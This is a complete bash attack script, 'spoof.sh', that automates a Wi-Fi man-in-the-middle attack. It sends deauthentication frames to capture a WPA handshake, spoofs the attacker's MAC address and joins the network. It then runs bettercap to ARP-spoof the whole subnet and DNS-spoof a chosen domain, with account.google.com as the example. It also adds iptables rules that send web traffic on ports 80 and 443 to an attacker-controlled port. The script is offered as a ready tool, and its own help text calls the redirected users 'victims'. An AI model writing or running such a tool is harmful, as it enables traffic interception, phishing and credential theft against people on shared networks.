#!/bin/bash

# ============================================
# spoof.sh <SSID> <domain> <target_ip> <port>
# ============================================

set -e

RED='\033[1;31m'; GREEN='\033[1;32m'; YELLOW='\033[1;33m'
CYAN='\033[1;36m'; NC='\033[0m'

usage() {
    echo -e "${CYAN}Usage:${NC} $0 <SSID> <domain> <target_ip> <port> [options]"
    echo ""
    echo "Arguments:"
    echo "  SSID        Target Wi-Fi network name"
    echo "  domain      Domain to spoof (e.g., account.google.com)"
    echo "  target_ip   IP to redirect victims to (e.g., 192.168.1.12)"
    echo "  port        Port your service listens on (e.g., 8080)"
    echo ""
    echo "Options:"
    echo "  -i, --iface   <iface>   Wireless interface (default: auto-detect)"
    echo "  -m, --mac     <mac>     Custom MAC address (default: random)"
    echo "  -o, --output  <dir>     Output directory (default: ./spoof_output)"
    echo "  -h, --help              Show this help"
    echo ""
    echo -e "${YELLOW}Example:${NC}"
    echo "  sudo $0 MyWiFi account.google.com 192.168.1.12 8080"
    exit 0
}

# ── Parse positional args ──
if [[ $# -lt 4 ]]; then
    usage
fi

SSID="$1"
DOMAIN="$2"
SPOOF_IP="$3"
SERVICE_PORT="$4"
shift 4

IFACE=""
CUSTOM_MAC=""
OUTPUT_DIR="./spoof_output"

while [[ $# -gt 0 ]]; do
    case "$1" in
        -i|--iface)     IFACE="$2";      shift 2 ;;
        -m|--mac)       CUSTOM_MAC="$2"; shift 2 ;;
        -o|--output)    OUTPUT_DIR="$2"; shift 2 ;;
        -h|--help)      usage ;;
        *)              echo -e "${RED}Unknown option: $1${NC}"; usage ;;
    esac
done

# ── Pre-flight ──
if [[ $EUID -ne 0 ]]; then
    echo -e "${RED}[!] Must be root (sudo)${NC}"; exit 1
fi

if [[ -z "$IFACE" ]]; then
    IFACE=$(iw dev | grep Interface | awk '{print $2}' | head -1)
    if [[ -z "$IFACE" ]]; then
        echo -e "${RED}[!] No wireless interface found. Use -i${NC}"; exit 1
    fi
fi

for cmd in airmon-ng airodump-ng aireplay-ng macchanger bettercap iptables wpa_passphrase wpa_supplicant dhclient; do
    if ! command -v "$cmd" &>/dev/null; then
        echo -e "${RED}[!] $cmd not found${NC}"
        echo "Install: apt install aircrack-ng macchanger bettercap iptables wpasupplicant isc-dhcp-client"
        exit 1
    fi
done

mkdir -p "$OUTPUT_DIR"
TIMESTAMP=$(date +%Y%m%d_%H%M%S)
PREFIX="${OUTPUT_DIR}/${TIMESTAMP}"

echo -e "${GREEN}╔════════════════════════════════════════╗${NC}"
echo -e "${GREEN}║          SPOOF.SH                      ║${NC}"
echo -e "${GREEN}╠════════════════════════════════════════╣${NC}"
printf "${GREEN}║${NC} SSID:    %-30s ${GREEN}║${NC}\n" "$SSID"
printf "${GREEN}║${NC} Domain:  %-30s ${GREEN}║${NC}\n" "$DOMAIN"
printf "${GREEN}║${NC} Target:  %-30s ${GREEN}║${NC}\n" "$SPOOF_IP"
printf "${GREEN}║${NC} Port:    %-30s ${GREEN}║${NC}\n" "$SERVICE_PORT"
printf "${GREEN}║${NC} Iface:   %-30s ${GREEN}║${NC}\n" "$IFACE"
echo -e "${GREEN}╚════════════════════════════════════════╝${NC}"

# ────────────────────────────────────────────────
# PHASE 1: Scan & capture WPA handshake
# ────────────────────────────────────────────────
echo -e "${YELLOW}[*]${NC} Phase 1: Capture WPA handshake"

airmon-ng check kill &>/dev/null || true
airmon-ng start "$IFACE" &>/dev/null
MON_IFACE="${IFACE}mon"

timeout 15 airodump-ng "$MON_IFACE" --write "${PREFIX}_scan" --output-format csv &>/dev/null || true

BSSID=$(grep -i "$SSID" "${PREFIX}_scan-01.csv" 2>/dev/null | head -1 | awk -F',' '{print $1}' | tr -d ' ')
CHANNEL=$(grep -i "$SSID" "${PREFIX}_scan-01.csv" 2>/dev/null | head -1 | awk -F',' '{print $4}' | tr -d ' ')

if [[ -z "$BSSID" ]]; then
    echo -e "${RED}[!] SSID '$SSID' not found${NC}"
    airmon-ng stop "$MON_IFACE" &>/dev/null || true
    exit 1
fi

echo -e "${GREEN}[+]${NC} Found: BSSID=$BSSID Channel=$CHANNEL"

airodump-ng --channel "$CHANNEL" --bssid "$BSSID" --write "${PREFIX}_handshake" "$MON_IFACE" &>/dev/null &
AIRODUMP_PID=$!
sleep 3
aireplay-ng --deauth 5 -a "$BSSID" "$MON_IFACE" &>/dev/null || true
sleep 8
kill "$AIRODUMP_PID" 2>/dev/null || true
wait "$AIRODUMP_PID" 2>/dev/null || true

# ────────────────────────────────────────────────
# PHASE 2: Ask for password (manual)
# ────────────────────────────────────────────────
echo ""
echo -e "${YELLOW}[?]${NC} Enter WPA password for '$SSID':"
read -r -s PASSWORD
echo ""

# ────────────────────────────────────────────────
# PHASE 3: MAC spoof + Wi-Fi connect
# ────────────────────────────────────────────────
echo -e "${YELLOW}[*]${NC} Phase 3: MAC spoof + connect"

airmon-ng stop "$MON_IFACE" &>/dev/null || true
ip link set "$IFACE" down

if [[ -n "$CUSTOM_MAC" ]]; then
    ip link set dev "$IFACE" address "$CUSTOM_MAC"
    echo -e "${GREEN}[+]${NC} MAC set to: $CUSTOM_MAC"
else
    OLD=$(cat /sys/class/net/"$IFACE"/address)
    macchanger -r "$IFACE" &>/dev/null
    NEW=$(cat /sys/class/net/"$IFACE"/address)
    echo -e "${GREEN}[+]${NC} MAC: $OLD → $NEW"
fi

ip link set "$IFACE" up
sleep 2

WPA_CONF="${PREFIX}_wpa.conf"
wpa_passphrase "$SSID" "$PASSWORD" > "$WPA_CONF"
pkill -f "wpa_supplicant.*${IFACE}" 2>/dev/null || true
sleep 1
wpa_supplicant -B -i "$IFACE" -c "$WPA_CONF"
sleep 3
dhclient "$IFACE" -v 2>&1 | tail -3
OUR_IP=$(ip -4 addr show "$IFACE" | grep -oP '(?<=inet\s)\d+(\.\d+){3}')
echo -e "${GREEN}[+]${NC} Connected! IP: $OUR_IP"

# ────────────────────────────────────────────────
# PHASE 4: Bettercap + iptables
# ────────────────────────────────────────────────
echo -e "${YELLOW}[*]${NC} Phase 4: Spoofing $DOMAIN → $SPOOF_IP:$SERVICE_PORT"

iptables -t nat -F PREROUTING 2>/dev/null || true
iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port "$SERVICE_PORT"
iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-port "$SERVICE_PORT"

SUBNET="${OUR_IP%.*}.0/24"

echo ""
echo -e "${CYAN}═══════════════════════════════════════════════════════════${NC}"
echo -e "${CYAN}  ACTIVE SPOOFING${NC}"
echo -e "${CYAN}    Domain:   ${NC}$DOMAIN → $SPOOF_IP"
echo -e "${CYAN}    Ports:    ${NC}80/443 → $SERVICE_PORT"
echo -e "${CYAN}    MAC:      ${NC}$(cat /sys/class/net/${IFACE}/address)"
echo -e "${CYAN}    Subnet:   ${NC}$SUBNET"
echo -e "${CYAN}    My IP:    ${NC}$OUR_IP"
echo -e "${CYAN}═══════════════════════════════════════════════════════════${NC}"
echo ""
echo -e "${GREEN}[*]${NC} Press Ctrl+C to stop and cleanup"
echo ""

bettercap -iface "$IFACE" -eval "set arp.spoof.targets $SUBNET; set arp.spoof.internal true; set arp.spoof.fullduplex true; set dns.spoof.domains $DOMAIN; set dns.spoof.address $SPOOF_IP; arp.spoof on; dns.spoof on; http.proxy on"

# ── Cleanup ──
cleanup() {
    echo ""
    echo -e "${YELLOW}[*]${NC} Cleaning up..."
    pkill -f bettercap 2>/dev/null || true
    iptables -t nat -F PREROUTING 2>/dev/null || true
    airmon-ng stop "${IFACE}mon" &>/dev/null || true
    systemctl restart NetworkManager 2>/dev/null || true
    echo -e "${GREEN}[+]${NC} Done."
}
trap cleanup EXIT